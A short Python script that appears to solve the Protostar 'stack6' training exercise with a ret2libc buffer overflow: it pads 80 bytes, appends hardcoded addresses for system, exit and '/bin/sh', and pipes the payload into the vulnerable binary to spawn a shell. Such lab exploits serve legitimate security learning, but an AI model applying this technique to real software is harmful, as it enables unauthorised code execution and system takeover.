
import os
import struct

sploit = "A"*80 # bof
sploit += struct.pack("I", 0xb7ecffb0) # system
sploit += struct.pack("I", 0xb7ec60c0) # exit
sploit += struct.pack("I", 0xb7fb63bf) # /bin/sh addr

with open("/tmp/stack6_sploit", "wb") as f:
	f.write(sploit)
os.system("(cat /tmp/stack6_sploit;echo"";cat) | /opt/protostar/bin/stack6")
os.remove("/tmp/stack6_sploit")
